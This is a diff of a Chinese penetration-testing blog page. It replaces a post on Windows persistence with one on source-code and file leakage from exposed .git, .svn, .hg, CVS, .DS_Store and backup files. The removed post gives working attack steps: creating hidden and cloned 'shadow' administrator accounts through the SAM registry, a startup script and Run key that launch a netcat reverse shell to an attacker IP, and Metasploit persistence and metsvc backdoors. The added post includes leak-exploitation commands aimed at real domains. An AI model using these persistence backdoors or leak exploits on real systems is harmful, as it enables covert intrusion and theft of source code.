@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Windows提权之权限维持 | Falao&#39;s Blog</title>
+  <title>信息收集 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Windows提权之权限维持 | Falao&#39;s Blog">
+  <meta name="description" content="信息收集 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -579,9 +579,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Windows提权之权限维持" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-信息收集" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Windows提权之权限维持</h1>
+        <h1 class="article-title">信息收集</h1>
     
     <div class="article-meta">
         
@@ -591,7 +591,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="后渗透专题">后渗透专题</a>
+            <a  data-rel="WEB渗透">WEB渗透</a>
             
         </span>
         
@@ -599,7 +599,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-20 16:13:22'>2021-01-19 10:20</time>
+            Created At : <time class="date" title='Updated At: 2021-02-20 19:57:44'>2021-02-20 19:43</time>
         
     </div>
     <div class="article-meta">
@@ -621,7 +621,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E8%B4%A6%E5%8F%B7%E5%88%9B%E5%BB%BA"><span class="toc-text">影子账号创建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%99%AE%E9%80%9A%E8%B4%A6%E5%8F%B7"><span class="toc-text">创建普通账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="toc-text">创建隐藏账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%BD%B1%E5%AD%90%E8%B4%A6%E5%8F%B7"><span class="toc-text">创建影子账号</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E6%89%93%E5%BC%80%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">步骤一：打开注册表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E4%BF%AE%E6%94%B9%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="toc-text">步骤二：修改隐藏账号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E5%88%A0%E9%99%A4%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="toc-text">步骤三：删除隐藏账号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="toc-text">步骤四：创建隐藏账号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%EF%BC%9A%E6%B3%A8%E9%94%80%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="toc-text">步骤五：注销登录验证</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E8%87%AA%E5%8A%A8%E5%8F%8D%E5%BC%B9"><span class="toc-text">NC自动反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95"><span class="toc-text">NC常规测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%87%AA%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-text">1. 自启动目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8"><span class="toc-text">2. 注册表启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E9%AA%8C%E8%AF%81"><span class="toc-text">结果验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">MSF权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E9%93%BE%E6%8E%A5%EF%BC%9APersistence%E6%A8%A1%E5%9D%97"><span class="toc-text">反向链接：Persistence模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-text">简单介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E9%93%BE%E6%8E%A5%EF%BC%9AMetsvc%E6%A8%A1%E5%9D%97"><span class="toc-text">正向链接：Metsvc模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">简单介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-text">利用方式</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#X%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">X：信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-git-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-text">1. git 源码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-GitHub%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F"><span class="toc-text">2. GitHub源码泄漏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-SVN-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-text">3. SVN 源码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-CVS%E6%B3%84%E9%9C%B2"><span class="toc-text">4. CVS泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-hg%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F"><span class="toc-text">5. hg源码泄漏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-WEB-INF-web-xml-%E6%B3%84%E9%9C%B2"><span class="toc-text">6. WEB-INF&#x2F;web.xml 泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-SWP-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-text">7. SWP 文件泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-DS-Store-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-text">8. DS_Store 文件泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-Bazaar-bzr%E6%B3%84%E9%9C%B2"><span class="toc-text">9. Bazaar&#x2F;bzr泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6"><span class="toc-text">10. 网站备份压缩文件</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -637,86 +637,110 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="影子账号创建"><a href="#影子账号创建" class="headerlink" title="影子账号创建"></a>影子账号创建</h2><h3 id="创建普通账号"><a href="#创建普通账号" class="headerlink" title="创建普通账号"></a>创建普通账号</h3><blockquote>
-<p>net user laosec 123admiN@ /add                  #创建普通账号laosec密码为123admiN@<br>net localgroup administrators laosec /add   #将普通账号laosec添加进administrators组</p>
+        <h1 id="X：信息泄露"><a href="#X：信息泄露" class="headerlink" title="X：信息泄露"></a>X：信息泄露</h1><h4 id="1-git-源码泄露"><a href="#1-git-源码泄露" class="headerlink" title="1. git 源码泄露"></a>1. git 源码泄露</h4><blockquote>
+<p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码</p>
 </blockquote>
-<h3 id="创建隐藏账号"><a href="#创建隐藏账号" class="headerlink" title="创建隐藏账号"></a>创建隐藏账号</h3><blockquote>
-<p>net user laosec$ 123admiN@ /add                #创建隐藏账号laosec$密码为123admiN@(计算机管理可见)<br>net localgroup administrators laosec$ /add #将隐藏账号laosec$添加到administrators组中</p>
-</blockquote>
-<h3 id="创建影子账号"><a href="#创建影子账号" class="headerlink" title="创建影子账号"></a>创建影子账号</h3><h5 id="步骤一：打开注册表"><a href="#步骤一：打开注册表" class="headerlink" title="步骤一：打开注册表"></a>步骤一：打开注册表</h5><blockquote>
-<p>WIN+R–&gt;regedit  #注册表编辑器命令<br>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/<br>#遇到没有权限问题对HKEY_LOCAL_MACHINE/SAM/SAM右键-&gt;权限赋予当前用户administrator的具有完全控制和读取权限</p>
-</blockquote>
-<h5 id="步骤二：修改隐藏账号"><a href="#步骤二：修改隐藏账号" class="headerlink" title="步骤二：修改隐藏账号"></a>步骤二：修改隐藏账号</h5><blockquote>
-<p>在Users目录下有00000XXX开头的文件还有Names<br>找到Names文件夹下的administrator单击，可以看到右侧的类型，其类型的值便对应着上面00000XXX<br>选中与administrator所对应的00000XXX在右侧双击F键值，在弹出窗口中将值内容全部复制    </p>
-<p>#此值要给予要创建的影子账号的F键值中<br>在Names中找到要修改账户的类型值，找到其对应的00000XXX，并将刚才复制的内容覆盖掉其影子账户的F中的值</p>
-</blockquote>
-<blockquote>
-<p>导出Names下的影子账户为1.reg<br>导出Users下影子账户对应的00000XXX为2.reg</p>
-</blockquote>
-<h5 id="步骤三：删除隐藏账号"><a href="#步骤三：删除隐藏账号" class="headerlink" title="步骤三：删除隐藏账号"></a>步骤三：删除隐藏账号</h5><blockquote>
-<p>net user laosec$ /del        #删除隐藏账号laosec$</p>
-</blockquote>
-<h5 id="步骤四：创建隐藏账号"><a href="#步骤四：创建隐藏账号" class="headerlink" title="步骤四：创建隐藏账号"></a>步骤四：创建隐藏账号</h5><blockquote>
-<p>将1.reg导入到注册表中<br>将2.reg导入到注册表中</p>
-</blockquote>
-<h5 id="步骤五：注销登录验证"><a href="#步骤五：注销登录验证" class="headerlink" title="步骤五：注销登录验证"></a>步骤五：注销登录验证</h5><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sR624K"><img src="https://s3.ax1x.com/2021/01/20/sR624K.png"></a></p>
-<h2 id="NC自动反弹"><a href="#NC自动反弹" class="headerlink" title="NC自动反弹"></a>NC自动反弹</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
-<p>通过上传NC并配置注册表或开机自启动程序-&gt;重启服务器来获取到目标及其的CMD Shell</p>
-<blockquote>
 <ul>
-<li>攻击者与受害者网络能够互通</li>
-<li>攻击者VPS必须时刻监听相对应的端口</li>
-</ul>
-</blockquote>
-</blockquote>
-<h4 id="NC常规测试"><a href="#NC常规测试" class="headerlink" title="NC常规测试"></a>NC常规测试</h4><blockquote>
-<p>nc -lvvp port              #攻击者VPS操作 侦听本地port<br>nc -t -e cmd.exe ip port   #受害者操作    正向连接到攻击者的VPS </p>
-</blockquote>
-<h4 id="1-自启动目录"><a href="#1-自启动目录" class="headerlink" title="1. 自启动目录"></a>1. 自启动目录</h4><blockquote>
-<p>在受害者主机中进入到开机自启动目录下<br>C:\Documents and Settings\Administrator\「开始」菜单\程序\启动<br>创建sys.bat内容为<br>start /b nc -t -e cmd.exe 192.168.31.132 4444<br>在攻击者主机开启侦听<br>重启受害者主机，等待shell反弹</p>
-</blockquote>
-<h4 id="2-注册表启动"><a href="#2-注册表启动" class="headerlink" title="2. 注册表启动"></a>2. 注册表启动</h4><blockquote>
-<p>reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run” /v “sysone” /t REG_SZ /d “C:sys.bat” /f</p>
-</blockquote>
-<blockquote>
-<p>参数说明：<br>/v 所选项之下要添加的值名<br>   /t RegKey 数据类型 如果忽略，则采用 REG_SZ<br>   /d 要分配给添加的注册表 ValueName 的数据<br>   /f 不用提示就强行改写现有注册表项<br>在攻击者主机开启侦听<br>重启受害者主机，等待shell反弹</p>
-</blockquote>
-<h4 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h4><h2 id="MSF权限维持"><a href="#MSF权限维持" class="headerlink" title="MSF权限维持"></a>MSF权限维持</h2><h3 id="反向链接：Persistence模块"><a href="#反向链接：Persistence模块" class="headerlink" title="反向链接：Persistence模块"></a>反向链接：Persistence模块</h3><h4 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h4><blockquote>
-<p>一个vbs后门写入了开机启动项但是容易被发现!</p>
-</blockquote>
-<blockquote>
-<p>run persistence -U -i 10 -p 4444 -r 192.168.34.132</p>
-</blockquote>
-<blockquote>
-<p>参数解释：</p>
-<p>-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；<br>-i：  设置反向连接间隔时间，单位为秒；<br>-p：设置反向连接的端口号；<br>-r： 设置反向连接的ip地址；</p>
-</blockquote>
-<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><blockquote>
-<p>use exploit/multi /handler</p>
-<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
-<p>set LHOST</p>
-<p>set LPORT</p>
-<p>exploit</p>
-<p>meterpreter&gt;run persistence -U -i 10 -p 4444 -r 192.168.34.132</p>
-</blockquote>
-<h3 id="正向链接：Metsvc模块"><a href="#正向链接：Metsvc模块" class="headerlink" title="正向链接：Metsvc模块"></a>正向链接：Metsvc模块</h3><h4 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h4><blockquote>
-<p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
-<ul>
-<li><p>metsvc.dll</p>
+<li><p>漏洞利用工具：GitHack</p>
 </li>
-<li><p>metsvc-service.exe</p>
+<li><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
 </li>
-<li><p>metsvc.exe</p>
+<li><p>用法示例：</p>
+<pre><code class="shell">GitHack.py http://www.openssl.org/.git/</code></pre>
 </li>
 </ul>
+<blockquote>
+<p><strong>修复建议：</strong>删除.git目录或者修改中间件配置进行对.git隐藏文件夹的访问</p>
 </blockquote>
-<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><blockquote>
-<p>use exploit/multi /handler</p>
-<p>set PAYLOAD windows/metsvc_bind_tcp   </p>
-<p>set RHOST     #设置要连接的远程主机</p>
-<p>set LPORT      #设置本地端口即：31337</p>
-<p>exploit</p>
+<h4 id="2-GitHub源码泄漏"><a href="#2-GitHub源码泄漏" class="headerlink" title="2. GitHub源码泄漏"></a>2. GitHub源码泄漏</h4><blockquote>
+<p>GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。类似的代码托管平台还有很多，人才是最大的漏洞</p>
 </blockquote>
+<pre><code class="http">https://github.com/search?q=smtp+user+@qq.com&amp;type=code</code></pre>
+<h4 id="3-SVN-源码泄露"><a href="#3-SVN-源码泄露" class="headerlink" title="3. SVN 源码泄露"></a>3. SVN 源码泄露</h4><blockquote>
+<p>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn/entries文件，获取到服务器源码</p>
+</blockquote>
+<ul>
+<li>漏洞利用工具：Seay SVN漏洞利用工具</li>
+</ul>
+<blockquote>
+<p><strong>修复建议：</strong>删除web目录中所有.svn隐藏文件夹，开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码</p>
+</blockquote>
+<h4 id="4-CVS泄露"><a href="#4-CVS泄露" class="headerlink" title="4. CVS泄露"></a>4. CVS泄露</h4><blockquote>
+<p>CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息</p>
+</blockquote>
+<pre><code class="shell">http://url/CVS/Root 返回根信息
+http://url/CVS/Entries 返回所有文件的结构</code></pre>
+<ul>
+<li><p>漏洞利用工具：dvcs-rippe</p>
+</li>
+<li><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p>
+</li>
+<li><p>运行示例:</p>
+<pre><code class="shell">rip-cvs.pl -v -u http://www.example.com/CVS/</code></pre>
+</li>
+</ul>
+<h4 id="5-hg源码泄漏"><a href="#5-hg源码泄漏" class="headerlink" title="5. hg源码泄漏"></a>5. hg源码泄漏</h4><blockquote>
+<p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg</p>
+</blockquote>
+<ul>
+<li><p>漏洞利用工具：dvcs-ripper</p>
+</li>
+<li><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p>
+</li>
+<li><p>用法示例：</p>
+<pre><code class="shell">rip-hg.pl -v -u http://www.example.com/.hg/</code></pre>
+</li>
+</ul>
+<h4 id="6-WEB-INF-web-xml-泄露"><a href="#6-WEB-INF-web-xml-泄露" class="headerlink" title="6. WEB-INF/web.xml 泄露"></a>6. WEB-INF/web.xml 泄露</h4><blockquote>
+<p>WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问</p>
+</blockquote>
+<p><strong>WEB-INF 主要包含一下文件或目录：</strong></p>
+<pre><code class="shell">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.
+WEB-INF/database.properties : 数据库配置文件
+WEB-INF/classes/ : 一般用来存放Java类文件(.class)
+WEB-INF/lib/ : 用来存放打包好的库(.jar)
+WEB-INF/src/ : 用来放源代码(.asp和.php等)</code></pre>
+<p><strong>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码</strong></p>
+<h4 id="7-SWP-文件泄露"><a href="#7-SWP-文件泄露" class="headerlink" title="7. SWP 文件泄露"></a>7. SWP 文件泄露</h4><blockquote>
+<p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp</p>
+</blockquote>
+<blockquote>
+<p><strong>漏洞利用：</strong>直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件</p>
+</blockquote>
+<h4 id="8-DS-Store-文件泄露"><a href="#8-DS-Store-文件泄露" class="headerlink" title="8. DS_Store 文件泄露"></a>8. DS_Store 文件泄露</h4><blockquote>
+<p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件</p>
+</blockquote>
+<ul>
+<li><p>漏洞利用工具:</p>
+<pre><code class="http">https://github.com/lijiejie/ds_store_exp</code></pre>
+</li>
+<li><p>用法示例：</p>
+<pre><code class="shell">ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store</code></pre>
+</li>
+</ul>
+<h4 id="9-Bazaar-bzr泄露"><a href="#9-Bazaar-bzr泄露" class="headerlink" title="9. Bazaar/bzr泄露"></a>9. Bazaar/bzr泄露</h4><blockquote>
+<p>bzr也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面</p>
+</blockquote>
+<ul>
+<li><p>运行示例：</p>
+<pre><code class="shell">rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre>
+</li>
+</ul>
+<h4 id="10-网站备份压缩文件"><a href="#10-网站备份压缩文件" class="headerlink" title="10. 网站备份压缩文件"></a>10. 网站备份压缩文件</h4><blockquote>
+<p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。</p>
+</blockquote>
+<p><strong>常见的备份文件后缀：</strong></p>
+<pre><code class="shell">.rar
+.zip
+.7z
+.tar.gz
+.bak
+.txt
+.old
+.temp</code></pre>
+<ul>
+<li>漏洞利用工具：御剑</li>
+</ul>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
